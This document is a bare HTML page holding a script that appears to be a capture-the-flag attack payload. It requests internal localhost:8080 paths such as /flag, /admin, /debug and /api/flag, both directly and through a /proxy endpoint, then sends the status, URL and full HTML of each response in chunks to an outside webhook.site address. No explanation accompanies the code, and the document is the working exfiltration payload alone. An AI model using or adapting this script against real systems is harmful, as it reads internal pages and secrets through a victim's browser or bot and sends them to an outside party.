<!DOCTYPE html>
<html>
<head>
<title>a</title>
</head>
<body>
<script>

const webhook = "https://7332d1d2-cd75-48ac-a396-869e505e7dca.webhook.site";

const paths = [
"/postcard-from-nyc",
"/flag",
"/",
"/admin",
"/debug",
"/save",
"/view",
"/api",
"/api/flag",
"/api/debug"
];

function sendHTML(tag, html){

  fetch(webhook + "/len?src=" + tag + "&l=" + html.length);

  const chunk = 400;

  for(let i=0;i<html.length;i+=chunk){
    const part = html.slice(i,i+chunk);
    fetch(webhook + "/html?src=" + tag + "&i=" + i + "&d=" + encodeURIComponent(part));
  }

}

function debug(tag, r){
  fetch(webhook + "/status?src=" + tag + "&s=" + r.status);
  fetch(webhook + "/type?src=" + tag + "&t=" + r.type);
  fetch(webhook + "/url?src=" + tag + "&u=" + encodeURIComponent(r.url));
}

paths.forEach(p=>{

  const url = "http://localhost:8080" + p;

  const proxy =
  "http://localhost:8080/proxy?url=" +
  encodeURIComponent(url);

  fetch(proxy)
  .then(async r=>{

    debug("proxy"+p,r);

    const html = await r.text();
    sendHTML("proxy"+p,html);

  })
  .catch(e=>{
    fetch(webhook + "/err?src=proxy"+p+"&e=" + encodeURIComponent(e));
  });


  fetch(url)
  .then(async r=>{

    debug("direct"+p,r);

    const html = await r.text();
    sendHTML("direct"+p,html);

  })
  .catch(e=>{
    fetch(webhook + "/err?src=direct"+p+"&e=" + encodeURIComponent(e));
  });

});


</script>
</body>
</html>
